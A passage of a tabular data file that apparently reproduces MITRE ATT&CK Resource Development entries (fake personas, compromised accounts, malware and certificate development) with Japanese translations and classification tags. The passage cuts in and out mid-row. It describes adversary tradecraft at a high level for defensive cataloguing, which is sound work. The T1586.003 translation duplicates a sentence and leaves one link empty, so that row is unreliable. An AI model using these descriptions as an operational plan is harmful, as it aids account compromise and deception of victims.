攻撃者は侵害されたネットワーク機器から再利用可能な認証情報（例：[有効なアカウント](https://attack.mitre.org/techniques/T1078)）を収集できる可能性もある。 攻撃者は、堅牢なホストベース防御を特にサポートしていないインターネット接続のエッジデバイスや関連ネットワーク機器を標的とする傾向があります。（引用元：Mandiant Fortinet Zero Day）（引用元：Wired Russia Cyberwar）侵害されたネットワーク機器は、確立された[プロキシ](https://attack.mitre.org/techniques/T1090)を介した[コマンドアンドコントロール](https://attack.mitre.org/tactics/TA0011)活動（例： 確立された[プロキシ](https://attack.mitre.org/techniques/T1090)および/または[ボットネット](https://attack.mitre.org/techniques/T1584/005)ネットワークを介した[インフラ隠蔽](https://attack.mitre.org/techniques/T1665)(引用: Justice GRU 2024),resource-development,PRE,credential_abuse,unknown,authentication_system;user_interaction;endpoint_execution;network_connectivity,specified,Proxy / Gateway,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--149b477f-f364-4824-b1b5-aa1d56115869,2024-03-28T03:29:35.616Z,2025-04-15T22:51:26.650Z,,,,
T1585,,Establish Accounts,アカウントの確立,"Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for malicious purposes.(Citation: Free Trial PurpleUrchin)",敵対者は標的化時に利用可能なサービス上でアカウントを作成・育成する可能性がある。敵対者は作戦推進のためのペルソナ構築に利用可能なアカウントを作成し得る。 ペルソナ構築には、公開情報、存在感、経歴、適切な所属関係の形成が含まれる。この構築は、ソーシャルメディア、ウェブサイト、その他の公開情報に適用可能であり、当該ペルソナまたは身元を用いた作戦の過程で、正当性を参照・精査される可能性がある。(引用: NEWSCASTER2014)(引用: BlackHatRobinSage) ソーシャルエンジニアリングを組み込んだ作戦では、オンライン上のペルソナ活用が重要となる場合がある。 これらのペルソナは架空のものでも、実在の人物を装うものでもよい。ペルソナは単一サイトに存在する場合もあれば、複数サイト（例：Facebook、LinkedIn、Twitter、Google、GitHub、Docker Hubなど）にまたがる場合もある。ペルソナを確立するには、より現実味を持たせるための追加資料の作成が必要となる場合がある。これにはプロフィール情報の記入、ソーシャルネットワークの構築、写真の使用などが含まれる。（引用元：NEWSCASTER2014）(引用元: BlackHatRobinSage) アカウント作成にはメールプロバイダーへの登録も含まれ、これらは[情報フィッシング](https://attack.mitre.org/techniques/T1598)や[フィッシング](https://attack.mitre.org/techniques/T1566)に直接悪用される可能性がある。(引用元: Mandiant APT1) さらに、アカウント作成により攻撃者は無料サービスを悪用する可能性があり、例えばトライアル期間に登録して悪意のある目的で[インフラを取得](https://attack.mitre.org/techniques/T1583)することが挙げられる。(引用元: Free Trial PurpleUrchin),resource-development,PRE,data_collection,unknown,user_interaction;network_connectivity;email_infrastructure;file_storage_access,specified,File Server;Mail / Collaboration,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--cdfc5f0a-9bb9-4352-b896-553cfa2d8fd8,2020-10-01T01:05:42.216Z,2025-04-15T22:28:26.144Z,,,,
T1585.001,T1585,Social Media Accounts,ソーシャルメディアアカウント,"Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",攻撃者は標的攻撃時に使用可能なソーシャルメディアアカウントを作成・育成する可能性がある。攻撃者は作戦推進のためのペルソナ構築に利用可能なソーシャルメディアアカウントを作成できる。ペルソナ開発には公開情報の構築、存在感の確立、経歴の形成、適切な所属関係の構築が含まれる。(引用元: NEWSCASTER2014)(引用元: BlackHatRobinSage) ソーシャルエンジニアリングを組み込んだ作戦では、ソーシャルメディア上でのペルソナ活用が重要となる場合がある。 これらのペルソナは架空のものであったり、実在の人物を装うものである可能性がある。ペルソナは単一のソーシャルメディアサイト上に存在する場合もあれば、複数のサイト（例：Facebook、LinkedIn、Twitterなど）にまたがって存在する場合もある。ソーシャルメディア上でペルソナを確立するには、それを本物らしく見せるための追加的な資料の作成が必要となる場合がある。これにはプロフィール情報の記入、ソーシャルネットワークの構築、写真の使用などが含まれる。ペルソナが構築されると、敵対者はそれを利用して関心のあるターゲットとのつながりを構築することができる。 これらの接続は直接的なものもあれば、第三者を通じた接続を試みるものもある（引用: NEWSCASTER2014）（引用: BlackHatRobinSage）。これらのアカウントは、敵対者ライフサイクルの他のフェーズ（例：初期アクセス段階［サービス経由のスピアフィッシング］（https://attack.mitre.org/techniques/T1566/003））においても活用される可能性がある。,resource-development,PRE,data_collection,unknown,user_interaction;network_connectivity;file_storage_access,specified,File Server,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--b1ccd744-3f78-4a0e-9bb2-2002057f7928,2020-10-01T01:08:41.124Z,2025-04-15T23:09:01.225Z,,,,
T1585.002,T1585,Email Accounts,電子メールアカウント,"Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Establishing email accounts may also allow adversaries to abuse free services  Esuch as trial periods  Eto [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for follow-on purposes.(Citation: Free Trial PurpleUrchin) Adversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1) To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016)",攻撃者は標的化活動中に使用可能なメールアカウントを作成する場合がある。メールプロバイダーで作成したアカウントを、[情報取得目的のフィッシング](https://attack.mitre.org/techniques/T1598) や [フィッシング](https://attack.mitre.org/techniques/T1566) などの作戦推進に悪用できる。(引用元: Mandiant APT1) 電子メールアカウントの確立により、敵対者は無料サービスを悪用することも可能となる。例えば試用期間を利用して、[インフラの取得](https://attack.mitre.org/techniques/T1583) を後続の目的のために行う。(引用元: Free Trial PurpleUrchin) 敵対者は、[ソーシャルメディアアカウント](https://attack.mitre.org/techniques/T1585/001) などを利用してメールアカウント周辺のペルソナを構築し、後続行動の成功確率を高める措置を講じる場合もある。 作成されたメールアカウントは、インフラ取得（例：[ドメイン](https://attack.mitre.org/techniques/T1583/001)）にも利用される。(引用元: Mandiant APT1) 物理的に自身への操作の痕跡を残す可能性を減らすため、敵対者は使い捨てメールサービスを利用する場合がある。(引用元: Trend Micro R980 2016),resource-development,PRE,other,unknown,user_interaction;email_infrastructure,specified,Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--65013dd2-bc61-43e3-afb5-a14c4fa7437a,2020-10-01T01:09:53.217Z,2025-04-15T22:25:33.493Z,,,,
T1585.003,T1585,Cloud Accounts,クラウドアカウント,"Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud) Creating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) may also require adversaries to establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002) to register with the cloud provider.",攻撃者は標的攻撃時に使用可能なクラウドプロバイダーのアカウントを作成する可能性がある。攻撃者はクラウドアカウントを運用拡大に活用でき、これにはDropbox、MEGA、 Microsoft OneDrive、AWS S3バケットなどのクラウドストレージサービスを活用して[クラウドストレージへの情報流出](https://attack.mitre.org/techniques/T1567/002)や[ツールのアップロード](https://attack.mitre.org/techniques/T1608/002)を行うなど、作戦を推進するためにクラウドアカウントを利用できる。 クラウドアカウントは、[仮想専用サーバー](https://attack.mitre.org/techniques/T1583/003)や[サーバーレス](https://attack.mitre.org/techniques/T1583/007)インフラなどのインフラ取得にも利用可能です。クラウドアカウントの確立により、攻撃者は自前のサーバーを管理せずに高度な能力を開発できる可能性があります。（引用元：Awake Security C2 Cloud）[クラウドアカウント](https://attack.mitre.org/techniques/T1585/003)の作成には、クラウドプロバイダーへの登録のために[メールアカウント](https://attack.mitre.org/techniques/T1585/002)の確立が必要となる場合もある。,resource-development,PRE,data_exfiltration,unknown,user_interaction;email_infrastructure;cloud_control_plane;file_storage_access;logging_monitoring,specified,Log / Monitoring Server;Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--926d8cfd-1d0d-4da2-ab49-3ca10ec3f3b5,2022-05-27T14:06:05.130Z,2025-04-15T22:01:31.837Z,,,,
T1586,,Compromise Accounts,アカウントの侵害,"Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos. Adversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).",敵対者は、標的とする際に使用できるサービスでアカウントを侵害する可能性がある。 ソーシャルエンジニアリングを組み込んだ作戦では、オンライン上のペルソナ（架空の身分）の利用が重要となる場合がある。アカウントの作成・育成（すなわち[アカウントの確立](https://attack.mitre.org/techniques/T1585)）ではなく、攻撃者は既存のアカウントを侵害する可能性がある。既存のペルソナを利用することで、侵害されたペルソナと関係がある、あるいはその存在を知っている潜在的な被害者に対して、一定の信頼感を生むことができる。 アカウント侵害には様々な手法が存在します。例えば、[情報フィッシング](https://attack.mitre.org/techniques/T1598)による認証情報の収集、第三者サイトからの認証情報購入、認証情報のブルートフォース攻撃（例：侵害された認証情報ダンプからのパスワード再利用）、従業員・サプライヤー・ビジネスパートナーへの報酬による認証情報へのアクセス権取得などです。(引用元: AnonHBGary)(引用元: Microsoft DEV-0537) アカウント侵害前に、攻撃者は偵察活動を行い、作戦推進のために侵害対象アカウントを決定する場合がある。ペルソナは単一サイトに存在する場合もあれば、複数サイト（例: Facebook、LinkedIn、Twitter、Googleなど）にまたがる場合もある。 侵害されたアカウントは追加の整備が必要となる場合があり、これにはプロフィール情報の入力・修正、ソーシャルネットワークの拡充、写真追加などが含まれる。攻撃者は侵害したメールアカウントを直接活用し、[情報フィッシング](https://attack.mitre.org/techniques/T1598)や[フィッシング](https://attack.mitre.org/techniques/T1566)を実行する可能性がある。,resource-development,PRE,credential_abuse,unknown,authentication_system;user_interaction;network_connectivity;email_infrastructure;file_storage_access,specified,File Server;Mail / Collaboration,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--81033c3b-16a4-46e4-8fed-9b030dd03c4a,2020-10-01T01:17:15.965Z,2025-04-15T22:07:30.871Z,,,,
T1586.001,T1586,Social Media Accounts,ソーシャルメディアアカウント,"Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos. Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",敵対者は標的化時に使用可能なソーシャルメディアアカウントを侵害する可能性がある。ソーシャルエンジニアリングを組み込んだ作戦では、オンライン上のペルソナ活用が重要となる場合がある。 ソーシャルメディアプロファイル（例：[ソーシャルメディアアカウント](https://attack.mitre.org/techniques/T1585/001)）を新規作成・育成する代わりに、攻撃者は既存のソーシャルメディアアカウントを侵害する場合がある。既存のペルソナを利用することで、侵害されたペルソナとの関係性や認知がある潜在的な被害者に対して一定の信頼を醸成できる可能性がある。 ソーシャルメディアアカウントを侵害する方法は多岐にわたり、[情報フィッシング](https://attack.mitre.org/techniques/T1598)による認証情報の収集、第三者サイトからの認証情報購入、認証情報のブルートフォース攻撃（例：侵害された認証情報ダンプからのパスワード再利用）などが挙げられる。(引用元: AnonHBGary) ソーシャルメディアアカウントを侵害する前に、攻撃者は偵察活動を行い、作戦推進のためにどのアカウントを侵害すべきか判断する。ペルソナは単一サイトに存在する場合もあれば、複数サイト（例: Facebook、LinkedIn、Twitterなど）にまたがる場合もある。侵害されたソーシャルメディアアカウントは追加の整備が必要となる場合があり、これにはプロフィール情報の入力・修正、ソーシャルネットワークの拡充、写真の追加などが含まれる。 攻撃者は侵害したソーシャルメディアプロフィールを、関心対象との新規接続構築や既存接続の乗っ取りに利用できる。接続は直接的である場合もあれば、第三者を介した接続試行を含む場合もある。(引用: NEWSCASTER2014)(引用: BlackHatRobinSage)侵害されたプロフィールは、敵対者ライフサイクルの他のフェーズ（例：初期アクセス段階［サービス経由のスピアフィッシング］(https://attack.mitre.org/techniques/T1566/003)）でも活用される可能性がある。,resource-development,PRE,credential_abuse,unknown,authentication_system;user_interaction;network_connectivity;file_storage_access,specified,File Server,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--274770e0-2612-4ccf-a678-ef8e7bad365d,2020-10-01T01:18:35.535Z,2025-04-15T23:08:45.478Z,,,,
T1586.002,T1586,Email Accounts,電子メールアカウント,"Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)). A variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or [Phishing](https://attack.mitre.org/techniques/T1566) emails may evade reputation-based email filtering rules. Adversaries can use a compromised email account to hijack existing email threads with targets of interest.",攻撃者は標的設定時に使用可能なメールアカウントを侵害する可能性がある。侵害されたメールアカウントは、[情報取得目的のフィッシング](https://attack.mitre.org/techniques/T1598)、[フィッシング](https://attack.mitre.org/techniques/T1566)、大規模スパムメールキャンペーンの実施など、攻撃活動の推進に悪用される。 侵害されたメールアカウントを持つ既存のペルソナを利用することで、侵害されたペルソナと関係がある、またはその知識を持つ潜在的な被害者に対して一定の信頼を生む可能性がある。侵害されたメールアカウントは、インフラ（例：[ドメイン](https://attack.mitre.org/techniques/T1583/001)）の取得にも使用される。 メールアカウントを侵害する方法は多岐にわたり、[情報フィッシング](https://attack.mitre.org/techniques/T1598)による認証情報の収集、第三者サイトからの認証情報購入、認証情報のブルートフォース攻撃（例：侵害された認証情報ダンプからのパスワード再利用）、従業員・サプライヤー・ビジネスパートナーへの報酬による認証情報入手などが挙げられる。(引用元: AnonHBGary)(引用元: Microsoft DEV-0537) 電子メールアカウントを侵害する前に、敵対者は偵察活動を行い、作戦を推進するために侵害すべきアカウントの決定に情報を活用する場合があります。 攻撃者は、悪意のあるスパムや[フィッシング](https://attack.mitre.org/techniques/T1566)メールがレピュテーションベースのメールフィルタリングルールを回避できる可能性のある、よく知られたメールアカウントやドメインを標的にする可能性があります。攻撃者は侵害したメールアカウントを使用して、関心のある標的に対する既存のメールスレッドを乗っ取ることもできます。,resource-development,PRE,credential_abuse,unknown,authentication_system;user_interaction;email_infrastructure,specified,Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--3dc8c101-d4db-4f4d-8150-1b5a76ca5f1b,2020-10-01T01:20:53.104Z,2025-04-15T22:26:01.830Z,,,,
T1586.003,T1586,Cloud Accounts,クラウドアカウント,"Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Additionally, cloud-based messaging services such as Twilio, SendGrid, AWS End User Messaging, AWS SNS (Simple Notification Service), or AWS SES (Simple Email Service) may be leveraged for spam or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)(Citation: Netcraft SendGrid 2024) Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud) A variety of methods exist for compromising cloud accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, conducting [Password Spraying](https://attack.mitre.org/techniques/T1110/003) attacks, or attempting to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: MSTIC Nobelium Oct 2021) Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) between service providers and their customers.(Citation: MSTIC Nobelium Oct 2021)",敵対者は標的選定時に利用可能なクラウドアカウントを侵害する可能性がある。敵対者は侵害したクラウドアカウントを、DropboxやMicrosoft OneDrive、AWS S3バケットなどのクラウドストレージサービスを活用した[クラウドストレージへの情報流出](https://attack.mitre.org/techniques/T1567/002)や[ツールのアップロード](https://)を含む作戦推進に利用できる。 Microsoft OneDrive、AWS S3バケットなどのクラウドストレージサービスを活用し、[クラウドストレージへの情報流出](https://attack.mitre.org/techniques/T1567/002)や[ツールのアップロード](https://attack.mitre.org/techniques/T1608/002)を行うなど、作戦を推進するために利用する可能性があります。 クラウドアカウントは、[仮想専用サーバー](https://attack.mitre.org/techniques/T1583/003)や[サーバーレス](https://attack.mitre.org/techniques/T1583/007)インフラストラクチャといったインフラの取得にも利用される可能性があります。 さらに、Twilio、SendGrid、AWS End User Messaging、AWS SNS（Simple Notification Service）、AWS SES（Simple Email Service）などのクラウドベースのメッセージングサービスは、スパムや[フィッシング](https://attack.mitre.org/techniques/T1566)に悪用される可能性があります。(引用元: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)(引用元: Netcraft SendGrid 2024) クラウドアカウントを侵害することで、敵対者は自前のサーバーを管理することなく高度な能力を開発できる可能性があります。(引用元: Awake Security C2 Cloud) クラウドアカウントを侵害する方法は様々であり、例えば、[情報フィッシング](https://attack.mitre.org/techniques/T1598) による認証情報の収集、サードパーティサイトからの認証情報の購入、[パスワードスプレー攻撃](https://attack.mitre.org/techniques/T1110/003) 攻撃の実施、あるいは[アプリケーションアクセストークンの窃取](https://attack.mitre.org/techniques/T1528)の試みなど、様々な方法が存在する。(引用元: MSTIC Nobelium Oct 2021) クラウドアカウントを侵害する前に、敵対者は偵察活動を行い、作戦を推進するためにどのアカウントを侵害すべきか判断するための情報を収集する場合がある。 場合によっては、攻撃者はサービスプロバイダーと顧客間の[信頼関係](https://attack.mitre.org/techniques/T1199)を悪用する意図で、特権的なサービスプロバイダーアカウントを標的とする可能性がある。(引用元: MSTIC Nobelium 2021年10月),resource-development,PRE,credential_abuse,unknown,authentication_system;privileged_account;user_interaction;email_infrastructure;cloud_control_plane;file_storage_access;logging_monitoring,specified,Log / Monitoring Server;Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--3d52e51e-f6db-4719-813c-48002a99f43a,2022-05-27T14:30:01.904Z,2025-04-15T22:01:54.640Z,,,,
T1587,,Develop Capabilities,能力開発,"Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020) As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",敵対者は標的攻撃時に使用可能な能力を構築する場合がある。能力を購入、無断ダウンロード、窃取する代わりに、敵対者は自社内で独自の能力を開発する可能性がある。これは開発要件を特定し、マルウェア、エクスプロイト、自己署名証明書などのソリューションを構築するプロセスである。 敵対者は、敵対者ライフサイクルの複数のフェーズにわたる作戦を支援する能力を開発する可能性がある。（引用元：Mandiant APT1）（引用元：Kaspersky Sofacy）（引用元：Bitdefender StrongPity 2020年6月）（引用元：Talos Promethium 2020年6月）正当な開発活動と同様に、能力開発には異なるスキルセットが必要となる場合がある。 必要なスキルは社内に存在する可能性もあれば、外部委託が必要となる場合もある。委託先業者の利用は、敵対者が要件策定に関与し、その能力に対する一定の独占性を維持している限り、当該敵対者の開発能力の延長と見なされる可能性がある。,resource-development,PRE,other,unknown,endpoint_execution;cloud_control_plane,specified,Unknown,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--edadea33-549c-4ed1-9783-8f5a5853cbdf,2020-10-01T01:30:00.877Z,2025-04-15T22:17:05.876Z,,,,
T1587.001,T1587,Malware,マルウェア,"Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB) As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware. Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)",敵対者は標的攻撃時に使用可能なマルウェア及びその構成要素を開発する可能性がある。悪意のあるソフトウェアの構築には、ペイロード、ドロッパー、侵害後ツール、バックドア（バックドア化されたイメージを含む）、パッカー、C2プロトコルの開発、および感染したリムーバブルメディアの作成が含まれる。 敵対者は、遠隔マシンの制御維持、防御回避、侵害後の行動実行の手段として、作戦を支援するマルウェアを開発する可能性がある。(引用: Mandiant APT1)(引用: Kaspersky Sofacy)(引用: ActiveMalwareEnergy)(引用: FBI Flash FIN7 USB) 正当な開発活動と同様に、マルウェア開発には異なるスキルセットが必要となる場合がある。 必要なスキルは社内に存在する可能性もあれば、外部委託が必要となる場合もある。委託先の活用は、攻撃者が要件策定に関与し、マルウェアに対する一定の独占性を維持する限り、その攻撃者のマルウェア開発能力の延長と見なされる可能性がある。 C2プロトコル開発など、マルウェア開発の特定の側面では、攻撃者が追加インフラを取得する必要が生じる場合がある。例えば、C2通信にTwitterを利用するマルウェアを開発する場合、[Webサービス](https://attack.mitre.org/techniques/T1583/006)の利用が必要となる可能性がある。(引用元: FireEye APT29),resource-development,PRE,c2_communication,unknown,network_connectivity;cloud_control_plane,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--212306d8-efa4-44c9-8c2d-ed3d2e224aa0,2020-10-01T01:33:01.433Z,2025-04-15T22:47:44.654Z,,,,
T1587.002,T1587,Code Signing Certificates,コード署名証明書,"Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is. Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations.",攻撃者は標的攻撃時に使用可能な自己署名コード署名証明書を作成する可能性がある。コード署名とは、実行ファイルやスクリプトにデジタル署名を行い、ソフトウェア作成者を確認するとともにコードが改変・破損されていないことを保証するプロセスである。コード署名は開発者によるプログラムの真正性を一定レベルで保証し、プログラムが改ざんされていないことを保証する。(出典: Wikipedia コード署名)ユーザーやセキュリティツールは、証明書発行者や作者を知らなくても、署名付きコードを署名なしコードより信頼する可能性がある。[コード署名](https://attack.mitre.org/techniques/T1553/002)導入前、攻撃者は作戦で使用する自己署名コード署名証明書を開発する可能性がある。,resource-development,PRE,script_command_execution,unknown,user_interaction;endpoint_execution,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf,2020-10-01T01:41:08.652Z,2025-04-15T22:05:55.035Z,,,,
T1587.003,T1587,Digital Certificates,デジタル証明書,"Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA). Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). After creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their 